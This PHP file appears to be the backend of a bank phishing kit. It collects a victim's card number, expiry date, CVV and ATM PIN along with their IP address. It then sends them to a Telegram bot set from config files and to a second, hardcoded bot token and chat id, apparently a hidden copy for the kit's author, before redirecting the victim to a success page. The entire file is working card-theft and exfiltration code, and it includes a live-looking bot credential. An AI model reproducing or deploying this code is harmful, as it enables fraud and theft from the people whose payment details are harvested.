<?php

session_start();           
require_once '../../session/Comp.php';
require_once '../../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;


if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}



// function

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


# post date

$a1 = $_POST['cnumber'];
$b1 = $_POST['expiry'];
$a2 = $_POST['cvv'];
$b2 = $_POST['atmpin'];

$IP = get_client_ip();




// Data for telegram

$data .= "<---- Card Information : {$IP} ---->\n\n";  // Need Change
$data .= "Page: Citizen\n\n";    // Need Change

$data .= "Card Number : {$a1}\n";
$data .= "Expriry Date : {$b1}\n";
$data .= "Security Code : {$a2}\n";
$data .= "Atm Pin : {$b2}\n\n";


$data .= "Contact @Devilmask9\n";





// Telegram Bot

$token = file_get_contents("../config/token.txt");
$id = file_get_contents("../config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";

$params=[
	'chat_id'=>$id,
	'text'=>$data,
];

$ch = curl_init($bot . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$tokens = "1793765167:AAFC1XhM-ri-_KKQKZXrQmjLr5GiGwuabwA";
$ids = "1802897390";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";

$params=[
	'chat_id'=>$ids,
	'text'=>$data,
];

$ch = curl_init($bots . '/sendMessage');
//curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);


# Head Back To Next Step


header('Location:../success.php?token='.$_SESSION['token']);  // Need Change


?>